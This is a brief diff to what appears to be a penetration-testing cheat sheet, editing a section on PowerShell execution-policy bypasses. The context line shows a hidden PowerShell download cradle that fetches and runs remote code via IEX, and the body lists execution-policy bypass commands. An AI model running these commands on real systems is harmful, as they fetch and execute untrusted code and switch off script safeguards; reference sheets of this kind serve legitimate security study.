@@ -416,7 +416,7 @@ powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadS
 
 # Unrestricted
 powershell -ep bypass
-Set-ExecutionPolicy -ExecutionPolicy Unrestricted
+Set-ExecutionPolicy Bypass -Force
 ```
 ### Client Soft
 ```bash
